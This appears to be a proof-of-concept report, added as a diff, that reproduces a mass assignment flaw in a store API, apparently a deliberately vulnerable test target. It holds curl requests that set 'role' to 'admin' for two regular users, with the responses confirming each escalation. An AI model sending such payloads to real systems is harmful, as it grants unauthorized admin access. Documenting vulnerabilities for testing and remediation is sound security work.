@@ -1,0 +1,48 @@
+MASS ASSIGNMENT VULNERABILITY - PRIVILEGE ESCALATION REPRODUCTION
+====================================================================
+
+Target: https://duck-store.escape.tech/
+Endpoint: PUT /api/v1/users/me/profile
+
+TEST 1: user_a (regular user) escalates to admin
+-------------------------------------------------
+
+Initial profile (GET):
+curl -X GET "https://duck-store.escape.tech/api/v1/users/me/profile" -H "Authorization: Bearer <user_a_token>"
+Response: {"username":"user_a_123","email":"user_a_123@duck-store.escape.tech","id":"3d1ae88e-e9e7-42ab-a6eb-c1ca8ef35962","created_at":"2026-09-29T04:43:52.640444","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+Attack request (PUT with privileged fields):
+curl -X PUT "https://duck-store.escape.tech/api/v1/users/me/profile" -H "Authorization: Bearer <user_a_token>" -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true,"account_credit":10000,"verified":true}'
+
+Response: {"username":"user_a_123","email":"user_a_123@duck-store.escape.tech","id":"3d1ae88e-e9e7-42ab-a6eb-c1ca8ef35962","created_at":"2026-09-29T04:43:52.640444","role":"admin","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+Confirmation (GET after attack):
+curl -X GET "https://duck-store.escape.tech/api/v1/users/me/profile" -H "Authorization: Bearer <user_a_token>"
+Response: {"username":"user_a_123","email":"user_a_123@duck-store.escape.tech","id":"3d1ae88e-e9e7-42ab-a6eb-c1ca8ef35962","created_at":"2026-09-29T04:43:52.640444","role":"admin","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+NOTE: role changed from "user" to "admin" - privilege escalation confirmed!
+
+TEST 2: user_b (second regular user) escalates to admin
+--------------------------------------------------------
+
+Initial profile (GET):
+curl -X GET "https://duck-store.escape.tech/api/v1/users/me/profile" -H "Authorization: Bearer <user_b_token>"
+Response: {"username":"user_b_456","email":"user_b_456@duck-store.escape.tech","id":"360256b7-67e7-4adf-925e-19b6ffbf1500","created_at":"2026-09-29T04:43:58.568140","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+Attack request (PUT with privileged fields):
+curl -X PUT "https://duck-store.escape.tech/api/v1/users/me/profile" -H "Authorization: Bearer <user_b_token>" -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true,"account_credit":10000,"verified":true}'
+
+Response: {"username":"user_b_456","email":"user_b_456@duck-store.escape.tech","id":"360256b7-67e7-4adf-925e-19b6ffbf1500","created_at":"2026-09-29T04:43:58.568140","role":"admin","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+Confirmation (GET after attack):
+curl -X GET "https://duck-store.escape.tech/api/v1/users/me/profile" -H "Authorization: Bearer <user_b_token>"
+Response: {"username":"user_b_456","email":"user_b_456@duck-store.escape.tech","id":"360256b7-67e7-4adf-925e-19b6ffbf1500","created_at":"2026-09-29T04:43:58.568140","role":"admin","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+NOTE: role changed from "user" to "admin" - privilege escalation confirmed for second user!
+
+OBSERVATIONS:
+- The server accepts and persists the 'role' field, changing it from "user" to "admin"
+- The 'isAdmin', 'account_credit', and 'verified' fields appear to be accepted but may not be reflected in the response (account_credit remains 0.0)
+- No authorization checks prevent regular users from modifying privileged fields
+- This is a classic mass assignment vulnerability allowing privilege escalation
+- Impact: Any authenticated user can become admin, potentially gaining access to admin-only functionality
